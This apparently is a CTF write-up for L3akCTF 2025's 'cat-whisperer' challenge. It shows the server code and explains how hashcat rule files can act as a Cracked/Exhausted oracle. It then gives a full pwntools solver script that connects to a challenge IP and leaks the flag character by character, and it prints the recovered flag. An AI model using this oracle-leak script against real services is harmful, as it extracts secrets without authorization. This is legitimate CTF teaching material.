+++
title = 'L3akCTF 2025 - hash-cracking/cat-whisperer'

date = 2025-07-15T21:40:01-04:00
draft = false
+++

L3ak ctf had a very fun hash cracking category this year. I was working on this challenge at the very end and had a working script with a few minutes to go, but unfortunetly the script was slow and didn't complete in time :(

```python
import os
import base64
import random
import string
import tempfile
import subprocess

def main():

    flag = open("flag.txt", "r").read().rstrip()
    assert len(flag) == 42

    b64_data = input("Enter your base64-encoded rule file: ")

    try:
        rule_data = base64.b64decode(b64_data)
    except Exception:
        print(f"[ERROR] Failed to decode base64")
        exit()

    if len(rule_data) > 128:
        exit()

    uid = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    with tempfile.NamedTemporaryFile(delete=False, suffix=".rule") as rule_file:
        rule_file.write(rule_data)
        rule_path = rule_file.name

    try:
        # Most of these options are just to make hashcat more resource-friendly on remote
        process = subprocess.Popen(
            [
                "hashcat", "-D", "1","-d", "1", f"--session={uid}", "-m"
                "1400", "-w", "1", "-r", rule_path, "--potfile-disable",
                "hash.txt", "flag.txt",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env=os.environ
        )

        for line in process.stdout:
            if 'Status' in line.decode():
                print(line.decode())
                break

        process.stdout.close()
        process.wait()

    except Exception:
        print(f'[ERROR] Failed to run hashcat')
    finally:
        os.remove(rule_path)

if __name__ == "__main__":
    main()

```


We can pass a base64 encoded rule file into a remote service, and that rule file is used in the command `hashcat -m 1400 -r <your_rule.rule> hash.txt flag.txt` where hash.txt contains the hash `502a9ed8aa3938b1828e3cf31d6414b3e3d674ba318e06414be09318ccddb9e4`. This is the hash of the string `mE0w`

 `flag.txt` is our wordlist. The output of hashcat will show the current word it is trying from the wordlsit, but in this case the output is being cut off after the line that contains the status. Status will show as `Exhausted` if hashcat runs without cracking the hash and `Cracked` if the hash is cracked. We can use this to exfiltrate the flag using some clever rules!

 First `r` will reverse the string. `x01` will capture only the first letter of the flag. We can use `[` to rotate the flag left one position to capture every char in the flag. `sAm` will substitute `A` with `m`. Lastly `$E$0$w` will append `E0w` to the flag. So to find the last character of the flag, which we know will be `}` we would use a rule like `rx01s}m$E$0$w`. This would take the last char only replace `}` with `m` and append `E0w`. The command will return `Cracked`. If the character we are guessing is not right, the replace rule will now replace our character and it will return `Exhausted`. Repeating this for every character we can slowly exfiltrate the flag. Here is the complete script:

 ```python
from pwn import *
import base64
import time
import string

chars = string.ascii_letters + string.digits + string.punctuation

pos = 0
flag = ''
flag = "}"

while True:
    for elem in chars:
        guess = "r"
        guess += "[" * pos
        guess += "x01"
        guess += f"s{elem}m"
        guess += "$E$0$w"
        print(guess)
        encoded = base64.b64encode(guess.encode()).decode()
        p = remote("34.59.119.124", 13000)
        p.recvuntil("Enter your base64-encoded rule file: ")
        p.sendline(encoded)
        r = p.recvall()
        print(r)
        if b"Exhausted" in r:
            p.close()
            time.sleep(1)
        elif b"Cracked" in r:
            flag = elem + flag
            print(flag)
            pos += 1
            p.close()
        else:
            break
 ```


 `L3AK{Th3_H4sH_C4t_Wh15p3Rz_B4cK_fe0w_43oW}`